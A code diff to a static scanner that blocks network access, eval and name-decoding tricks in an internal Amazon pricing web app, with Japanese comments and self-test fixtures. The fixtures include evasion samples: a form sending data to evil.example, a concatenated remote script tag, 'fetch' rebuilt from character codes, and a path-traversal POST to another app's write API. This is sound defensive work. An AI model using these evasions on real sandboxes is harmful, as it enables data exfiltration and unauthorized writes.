@@ -38,6 +38,7 @@ const BANNED_WORDS_JS = [
   'fetch', 'eval', 'Function', 'globalThis', 'global', 'window', 'self', 'Reflect', 'process', 'require', 'WebSocket', 'XMLHttpRequest',
   'EventSource', 'Worker', 'WebAssembly', 'getBuiltinModule', 'dlopen', 'binding', 'constructor', '__proto__', 'prototype', 'Proxy',
   'request', 'http', 'https', 'net', 'tls', 'dns', 'child_process', 'vm', 'worker_threads', 'undici', 'axios', 'importScripts',
+  'fromCharCode', 'fromCodePoint', 'atob', 'btoa', 'Buffer', 'TextDecoder', 'decodeURIComponent', 'unescape',
   // SP-API / miniPC の書き込み口
   j('update', 'Price'), j('patch', 'ListingsItem'), j('patch', 'Listing'), j('put', 'ListingsItem'), j('create', 'Feed'), j('call', 'MiniPC'),
   j('WAREHOUSE', '_URL'), j('Selling', 'Partner'), j('purchasable', '_offer'), j('SP_API', '_CLIENT_ID'), j('SP_API', '_REFRESH_TOKEN'),
@@ -51,8 +52,11 @@ const BANNED_FRAGMENTS_JS = [
 const BANNED_WORDS_VIEW = [
   'eval', 'Function', 'XMLHttpRequest', 'WebSocket', 'sendBeacon', 'EventSource', 'import', 'window', 'self', 'globalThis', 'global', 'top',
   'parent', 'frames', 'opener', 'Worker', 'Reflect', 'http', 'https', 'open', 'postMessage', 'importScripts', 'srcdoc', 'constructor', '__proto__', 'prototype', 'Proxy',
+  'defaultView', 'fromCharCode', 'fromCodePoint', 'atob', 'btoa', 'unescape', 'decodeURI', 'decodeURIComponent', 'requestSubmit',
 ];
-const BANNED_FRAGMENTS_VIEW = [j('?.', '('), j('?.', '['), '.call(', '.apply(', '.bind(', 'createElement(', '.src', '.action', '//', 'javascript:', 'data:'];
+// setTimeout / setInterval は「文字列を渡す」形だけ禁止 (eval と同じ)。関数を渡す普通の使い方 (トースト・遅延リロード) は許す
+const BANNED_FRAGMENTS_VIEW = [j('?.', '('), j('?.', '['), '.call(', '.apply(', '.bind(', 'createElement(', '.src', '.action', '//', 'javascript:', 'data:',
+  j('setTimeout', "('"), j('setTimeout', '("'), j('setTimeout', '(`'), j('setInterval', "('"), j('setInterval', '("'), j('setInterval', '(`'), '.submit(', 'form.submit'];
 /** 静的 import の許可リスト (相対パスは別扱い) */
 const ALLOWED_BARE_IMPORTS = new Set(['express', 'path', 'fs', 'url', 'os', 'node:fs', 'node:path', 'node:url', 'node:os', 'better-sqlite3']);
 /** アプリのモジュール (./ で参照してよいもの)。test-* はここに無いので、本番ファイルからは import できない */
@@ -63,6 +67,8 @@ const ALLOWED_EXTERNAL = new Set(['../warehouse-mirror/db.js', '../price-update/
 const ARRAY_LITERAL_KEYWORDS = new Set(['of', 'in', 'return', 'typeof', 'await', 'yield', 'case', 'throw', 'delete', 'void', 'new', 'else', 'do', 'instanceof']);
 /** この語の直後の / は正規表現の始まり (割り算ではない) */
 const REGEX_AFTER_KEYWORDS = new Set(['return', 'throw', 'case', 'yield', 'typeof', 'instanceof', 'in', 'of', 'new', 'delete', 'void', 'do', 'else', 'await']);
+/** この語に続く ( ... ) の後の / も正規表現の始まり (if (x) /re/.test(y)) */
+const CONTROL_KEYWORDS = new Set(['if', 'while', 'for', 'with', 'catch']);
 
 /** 文字列・テンプレート・正規表現リテラルを壊さずにコメントだけ取り除く */
 export function stripComments(src) {
@@ -71,6 +77,15 @@ export function stripComments(src) {
   const n = src.length;
   let quote = null; // ' " ` のどれかの中
   let lastSignificant = ''; // 直前の空白以外の文字 (/ が正規表現の始まりか割り算かを見分ける)
+  const parenStack = []; // ( が if/while/for/with/catch の条件かどうか (その ) の後の / は正規表現 — Codex R5)
+  let lastCloseWasControl = false;
+  const wordBefore = () => {
+    let s = out.length - 1;
+    while (s >= 0 && /\s/.test(out[s])) s -= 1;
+    let e = s;
+    while (e >= 0 && /[\w$]/.test(out[e])) e -= 1;
+    return out.slice(e + 1, s + 1);
+  };
   while (i < n) {
     const c = src[i];
     const next = src[i + 1];
@@ -84,17 +99,14 @@ export function stripComments(src) {
     if (c === "'" || c === '"' || c === '`') { quote = c; out += c; lastSignificant = c; i += 1; continue; }
     if (c === '/' && next === '/') { while (i < n && src[i] !== '\n') i += 1; continue; }
     if (c === '/' && next === '*') { const end = src.indexOf('*/', i + 2); i = end < 0 ? n : end + 2; out += ' '; continue; }
-    // 正規表現リテラル: 値が来る位置 (演算子・( , = : [ ! & | ? { } ; の後、return/throw 等のキーワードの後、または行頭) の / から、
-    // エスケープと [...] を飛ばして次の / まで。中の // をコメントと誤認しない (Codex R3/R4 High)
-    let afterKeyword = false;
-    if (c === '/' && /[\w$]/.test(lastSignificant)) {
-      let s = out.length - 1;
-      while (s >= 0 && /\s/.test(out[s])) s -= 1;
-      let e = s;
-      while (e >= 0 && /[\w$]/.test(out[e])) e -= 1;
-      afterKeyword = REGEX_AFTER_KEYWORDS.has(out.slice(e + 1, s + 1));
-    }
-    if (c === '/' && (lastSignificant === '' || '(,=:[!&|?{};+-*%<>~^'.includes(lastSignificant) || afterKeyword)) {
+    if (c === '(') { parenStack.push(CONTROL_KEYWORDS.has(wordBefore())); }
+    if (c === ')') { lastCloseWasControl = parenStack.pop() === true; }
+    // 正規表現リテラル: 値が来る位置 (演算子・( , = : [ ! & | ? { } ; の後、return/throw 等のキーワードの後、
+    // if (...) など制御構文の ) の後、または行頭) の / から、エスケープと [...] を飛ばして次の / まで。
+    // 中の // をコメントと誤認しない (Codex R3/R4/R5 High)
+    const afterKeyword = c === '/' && /[\w$]/.test(lastSignificant) && REGEX_AFTER_KEYWORDS.has(wordBefore());
+    const afterControlParen = c === '/' && lastSignificant === ')' && lastCloseWasControl;
+    if (c === '/' && (lastSignificant === '' || '(,=:[!&|?{};+-*%<>~^'.includes(lastSignificant) || afterKeyword || afterControlParen)) {
       let k = i + 1;
       let inClass = false;
       let body = '/';
@@ -132,8 +144,27 @@ export function normalize(src) {
   return decodeEscapes(stripComments(src)).replace(/\s+/g, ' ').replace(/\s*([(.])\s*/g, '$1').replace(/\?\s*\.\s*/g, '?.');
 }
 
+/** 文字列リテラルの中身を空白にする (引用符は残す)。計算プロパティの検査で CSS セレクタ等の [ ] を見ないため */
+export function blankStrings(code) {
+  let out = '';
+  let quote = null;
+  for (let i = 0; i < code.length; i += 1) {
+    const c = code[i];
+    if (quote) {
+      if (c === '\\') { out += '  '; i += 1; continue; }
+      if (c === quote) { quote = null; out += c; continue; }
+      out += ' ';
+      continue;
+    }
+    if (c === "'" || c === '"' || c === '`') quote = c;
+    out += c;
+  }
+  return out;
+}
+
 /** 計算プロパティ (obj[...]) の中に引用符・バッククォート・${・+ があれば「名前を組み立てている」 */
-function findComputedConcat(code) {
+function findComputedConcat(rawCode) {
+  const code = blankStrings(rawCode);
   const hits = [];
   const re = /\[([^\]\n]*)\]/g;
   let m;
@@ -144,6 +175,30 @@ function findComputedConcat(code) {
     // その中に危険な名前があれば語の禁止 (文字列の中も見る) が別に拾う (obj['fetch'] は fetch で落ちる)
     if (/^\s*(['"])[^'"`$+]*\1\s*$/.test(inner)) continue;
     // 直前のトークン (空白を飛ばす) を見る。) ] か識別子 (配列リテラルの前に来るキーワード以外) なら計算プロパティ
+    let k = m.index - 1;
+    while (k >= 0 && /\s/.test(code[k])) k -= 1;
+    if (k < 0) continue;
+    const ch = code[k];
+    if (ch === ')' || ch === ']') { hits.push(m[0]); continue; }
+    if (/[\w$]/.test(ch)) {
+      let s = k;
+      while (s >= 0 && /[\w$]/.test(code[s])) s -= 1;
+      const word = code.slice(s + 1, k + 1);
+      if (!ARRAY_LITERAL_KEYWORDS.has(word)) hits.push(`${word}${m[0]}`);
+    }
+  }
+  return hits;
+}
+
+/** ブラウザ側: 識別子・) ・] の直後の [ ... ] は、中身が数値か単純な文字列リテラルでなければ全部拾う */
+function findComputedNonLiteral(rawCode) {
+  const code = blankStrings(rawCode); // 文字列の中の [ ] (CSS セレクタ等) は見ない。中身を空白にした文字列は「単純なリテラル」として通る
+  const hits = [];
+  const re = /\[([^\]\n]*)\]/g;
+  let m;
+  while ((m = re.exec(code))) {
+    const inner = m[1].trim();
+    if (/^\d+$/.test(inner) || /^(['"])[^'"`$+]*\1$/.test(inner)) continue;
     let k = m.index - 1;
     while (k >= 0 && /\s/.test(code[k])) k -= 1;
     if (k < 0) continue;
@@ -199,18 +254,18 @@ export function scanSource(src, { isView = false, checkImports = true, external 
   const problems = [];
   // 外部モジュール (warehouse-mirror/db.js 等) は URL の文字列や "request" という語を持つが、それ自体は通信ではない。
   // 通信の実体 (fetch / require / import( / node: / net / tls …) の禁止はそのまま効く
-  const bannedWords = external ? BANNED_WORDS_JS.filter((w) => !['http', 'https', 'request'].includes(w)) : BANNED_WORDS_JS;
+  // 名前の復号 (fromCharCode 等) の禁止は「アプリの中で名前を組み立てない」ためのもので、外部モジュールの正規化処理 (全角→半角等) は対象外
+  const EXTERNAL_EXEMPT = ['http', 'https', 'request', 'fromCharCode', 'fromCodePoint', 'atob', 'btoa', 'Buffer', 'TextDecoder', 'decodeURIComponent', 'unescape'];
+  const bannedWords = external ? BANNED_WORDS_JS.filter((w) => !EXTERNAL_EXEMPT.includes(w)) : BANNED_WORDS_JS;
   if (isView) {
-    // HTML 側: 外部読み込み・送信先を持つ要素
-    const html = stripComments(src.replace(/<%[^]*?%>/g, ' EJS ')); // EJS タグの中身は JS として別に見ない (テンプレ側のヘルパー呼び出し)
+    // HTML 側: 外部読み込み・送信先を持つ要素。★JS のコメント除去は掛けない (属性の https:// の // を行コメントと誤認して
+    // 以降を消してしまう — Codex R5 の「引用符なしの action」が検出できなかった原因)。HTML コメントと EJS タグだけ外す
+    const html = src.replace(/<%[^]*?%>/g, ' EJS ').replace(/<!--[^]*?-->/g, ' ');
     for (const [re, label] of [
       [/<script[^>]*\ssrc=/i, 'script src'], [/<script[^>]*type=["']module/i, 'script type=module'], [/<iframe/i, 'iframe'], [/<object/i, 'object'],
       [/<embed/i, 'embed'], [/<link/i, 'link'], [/<base/i, 'base'], [/<meta[^>]*http-equiv/i, 'meta http-equiv'], [/\bformaction=/i, 'formaction'],
       [/\bsrcdoc=/i, 'srcdoc'], [/javascript:/i, 'javascript: URL'], [/<img/i, 'img (外部画像は読み込ませない)'],
     ]) if (re.test(html)) problems.push(`HTML に ${label}`);
-    for (const m of html.matchAll(/\baction=["']([^"']*)["']/g)) {
-      if (!m[1].startsWith('/apps/amazon-pricing/')) problems.push(`form action が自分のパス以外: ${m[1]}`);
-    }
     for (const m of src.matchAll(/\bhref=["']([^"']*)["']/g)) {
       const v = m[1];
       if (!(v.startsWith('/') || v.startsWith('?') || v.startsWith('#') || v.startsWith('https://www.amazon.co.jp/dp/') || v.startsWith('<%= qs(') || v.startsWith('<%= new URLSearchParams'))) {
@@ -222,12 +277,25 @@ export function scanSource(src, { isView = false, checkImports = true, external 
     for (const s of serverSnippets) {
       for (const p of scanSource(s, { isView: false, checkImports: false })) problems.push(`EJS タグの中: ${p}`);
     }
-    // 生の HTML を出す <%- %> は、include と「< を < に変えた JSON」の 2 形だけ (Codex R4: 文字列連結で script src を生成できる)
+    // 生の HTML を出す <%- %> は、include と「< を < に変えた JSON」の 2 形だけ (Codex R4: 文字列連結で script src を生成できる)。
+    // include の先は**このアプリの views の中**だけ (Codex R5: 商品登録ハブの共通ヘッダは script と <link> を持ち、検査の外だった)
     for (const m of src.matchAll(/<%-([^]*?)%>/g)) {
       const body = m[1].trim();
-      const okInclude = /^include\(\s*'[\w./_-]+'\s*(,\s*\{[^}]*\}\s*)?\)$/.test(body);
+      const inc = /^include\(\s*'([\w-]+)'\s*(,\s*\{[^}]*\}\s*)?\)$/.exec(body);
       const okJson = /^JSON\.stringify\([^]*\)\.replace\(\/<\/g,\s*'\\\\u003c'\)$/.test(body);
-      if (!okInclude && !okJson) problems.push(`<%- %> の生出力が許可外の形: ${body.slice(0, 60)}`);
+      if (!inc && !okJson) problems.push(`<%- %> の生出力が許可外の形 (include は同じフォルダのファイル名だけ): ${body.slice(0, 60)}`);
+    }
+    if (/\binclude\(\s*['"][^'"]*[/\\.][^'"]*['"]/.test(src)) problems.push('include にパス区切り・ドットがある (アプリの views の外を取り込める)');
+    // form は GET か dialog だけ (POST form は別アプリの書き込みルートへ送れる — Codex R5)。action は自分の一覧・履歴だけで、正規化で外に出る断片は拒否
+    for (const m of html.matchAll(/<form\b([^>]*)>/gi)) {
+      const attrs = m[1];
+      const method = (/\bmethod\s*=\s*["']?([\w]+)/i.exec(attrs) || [])[1] || 'get';
+      if (!/^(get|dialog)$/i.test(method)) problems.push(`form の method が ${method} (GET / dialog 以外は禁止)`);
+      const action = (/\baction\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/i.exec(attrs) || []);
+      const value = action[1] ?? action[2] ?? action[3];
+      if (value != null) {
+        if (!/^\/apps\/amazon-pricing\/[\w-]*$/.test(value)) problems.push(`form action が許可外 (/apps/amazon-pricing/<画面名> だけ): ${value}`);
+      }
     }
     // JS 側: <script> の中身と on*= 属性
     const scripts = [...src.matchAll(/<script\b[^>]*>([^]*?)<\/script>/gi)].map((m) => m[1]);
@@ -237,7 +305,9 @@ export function scanSource(src, { isView = false, checkImports = true, external 
       const code = normalize(s);
       for (const w of BANNED_WORDS_VIEW) if (new RegExp(`(?<![\\w$])${w}(?![\\w$])`).test(code)) problems.push(`禁止語 "${w}"`);
       for (const f of BANNED_FRAGMENTS_VIEW) if (code.includes(f)) problems.push(`禁止 "${f}"`);
-      for (const h of findComputedConcat(code)) problems.push(`計算プロパティで名前を組み立てている: ${h.slice(0, 40)}`);
+      // ブラウザ側は計算プロパティを原則禁止 (数値か単純な文字列リテラルだけ許す)。
+      // 文字コードから名前を組み立てる経路 (defaultView[String.fromCharCode(...)]) を塞ぐ (Codex R5)
+      for (const h of findComputedNonLiteral(code)) problems.push(`計算プロパティ (ブラウザ側では数値・単純な文字列以外は禁止): ${h.slice(0, 40)}`);
       problems.push(...checkViewFetch(code));
     }
     return problems;
@@ -295,6 +365,18 @@ const appFiles = walk(HERE);
   for (const f of appFiles) {
     const problems = scanSource(fs.readFileSync(f, 'utf8'), { isView: f.endsWith('.ejs') });
     ok(problems.length === 0, `${rel(f)}: ${problems.length === 0 ? 'OK' : problems.join(' / ')}`);
+  }
+}
+
+console.log('\n── 1b. 画面の include の先は全部このフォルダの中にあり、走査済み ──');
+{
+  for (const f of appFiles.filter((x) => x.endsWith('.ejs'))) {
+    const src = fs.readFileSync(f, 'utf8');
+    for (const m of src.matchAll(/\binclude\(\s*'([^'"]+)'/g)) {
+      const target = path.resolve(path.dirname(f), m[1].endsWith('.ejs') ? m[1] : `${m[1]}.ejs`);
+      const relTarget = path.relative(HERE, target);
+      ok(!relTarget.startsWith('..') && !path.isAbsolute(relTarget) && fs.existsSync(target) && appFiles.includes(target), `${rel(f)}: include "${m[1]}" はアプリの views の中に実在し、走査済み`);
+    }
   }
 }
 
@@ -380,6 +462,9 @@ console.log('\n── 5. ★検査自身の検査: 回避コードは必ず落�
     ['Codex R3: \\u{} 形式', `${j('glob', 'al')}\\u{54}his.${j('fet', 'ch')}(u);`],
     ['Codex R3: \\x 形式', `${j('ev', 'a')}\\x6c(source);`],
     ['Codex R4: return 直後の正規表現の // でコメント誤認', `function marker() { return /[//]/; } ${j('fet', 'ch')}(url);`],
+    ['Codex R5: if (...) 直後の正規表現の // でコメント誤認', `if (ok) /[//]/.test(x); ${j('fet', 'ch')}(url);`],
+    ['Codex R5: 文字コードから名前 (サーバ側)', `const n = String.${j('from', 'CharCode')}(102, 101, 116, 99, 104);`],
+    ['Buffer で名前を復号', `const n = ${j('Buf', 'fer')}.from('ZmV0Y2g=', 'base64').toString();`],
     ['Codex R4: global[name] を配列 join で組み立て', `const n = ['fe', 'tch'].join(''); ${j('glob', 'al')}[n](u, { method: 'POST' });`],
     ['Codex R4: constructor 経由で Function', `const F = (() => {}).${j('constr', 'uctor')}; F('return 1')();`],
     ['__proto__ 経由', `const o = {}; o.${j('__pro', 'to__')}.x = 1;`],
@@ -412,6 +497,15 @@ console.log('\n── 5. ★検査自身の検査: 回避コードは必ず落�
     ['EJS タグの中の Unicode エスケープ', `<%= global\\u0054his.f\\u0065tch(u) %>`],
     ['Codex R4: <%- %> の文字列連結で script src を生成', `<%- ['<scr','ipt src="','ht','tps:','/','/evil/x.js"></scr','ipt>'].join('') %>`],
     ['<%- %> で変数を生出力', `<%- html %>`],
+    ['Codex R5: アプリの外の EJS を include', `<%- include('../../product-hub/views/_header') %>`],
+    ['Codex R5: POST form を別アプリへ (../ で正規化)', `<form method="post" action="/apps/amazon-pricing/../profit-calculator/api/amazon/manual-list"><input name="x"></form>`],
+    ['POST form (自分宛でも)', `<form method="POST" action="/apps/amazon-pricing/"><input name="x"></form>`],
+    ['引用符なしの action', `<form action=https://evil.example/collect><input name="x"></form>`],
+    ['Codex R5: 文字コードで名前を組み立てた計算プロパティ (ブラウザ側)', `<script>document.${j('default', 'View')}[String.${j('from', 'CharCode')}(102,101,116,99,104)](String.${j('from', 'CharCode')}(104));</script>`],
+    ['ブラウザ側の計算プロパティ (変数)', `<script>const g = document.body[name]; g(u);</script>`],
+    ['setTimeout に文字列', `<script>${j('set', 'Timeout')}('fe' + 'tch(u)', 1);</script>`],
+    ['form.submit() で送信', `<script>document.forms[0].${j('sub', 'mit')}();</script>`],
+    ['requestSubmit', `<script>f.${j('request', 'Submit')}();</script>`],
   ];
   for (const [label, code] of VIEW_EVASIONS) {
     const problems = scanSource(code, { isView: true });
@@ -426,7 +520,10 @@ console.log('\n── 5. ★検査自身の検査: 回避コードは必ず落�
   ok(scanSource(`const u = 'https://example.com'; const request = 1;`, { external: true }).length === 0, '通る (外部モジュール): URL 文字列と request という語');
   ok(scanSource(`const u = 'https://example.com';`).length > 0, '落ちる (アプリ): URL 文字列');
   ok(scanSource(`const re = /[",\\n\\r]/; const s = x.replace(/\\/\\//g, '-'); const y = a / b / c; function f() { return /[//]/; } const z = 1;`).length === 0, '通る: 正規表現リテラル (return 直後も) と割り算');
-  ok(scanSource(`<%- include('_top', { nav: 'index' }) %><%- include('_policy_dialog') %>`, { isView: true }).length === 0, '通る (画面): include の生出力');
+  ok(scanSource(`<%- include('_top', { nav: 'index' }) %><%- include('_policy_dialog') %>`, { isView: true }).length === 0, '通る (画面): 同じフォルダの include');
+  ok(scanSource(`<form class="filters" method="get" action="/apps/amazon-pricing/"><input type="text" name="q"></form><form method="dialog"><button>x</button></form>`, { isView: true }).length === 0, '通る (画面): GET form と dialog form');
+  ok(scanSource(`<script>var t = document.getElementById('toast'); t.style.display = 'block'; var arr = [1, 2]; var first = arr[0]; var v = obj['a-b']; var b = ev.target.closest('button[data-policy]'); setTimeout(function () { location.reload(); }, 600); form.addEventListener('submit', onSubmit);</script>`, { isView: true }).length === 0, '通る (画面): 数値・単純文字列の添字、CSS セレクタの [ ]、関数を渡す setTimeout、submit イベント');
+  ok(scanSource(`if (ok) /[//]/.test(x); const y = (a + b) / 2; while (z) /x/.exec(s);`).length === 0, '通る: 制御構文直後の正規表現と割り算');
   ok(scanSource(`<%- include('_top', { nav: 'index' }) %><% for (const r of rows) { %><td><%= yen(r.my_price) %></td><% } %>`, { isView: true }).length === 0, '通る (画面): 普通の EJS タグ');
   ok(scanSource(`<script>openPolicyDialog(<%- JSON.stringify(x).replace(/</g, '\\\\u003c') %>);</script>`, { isView: true }).length === 0, '通る (画面): XSS 対策の \\u003c 置換 (文字列の中)');
 }
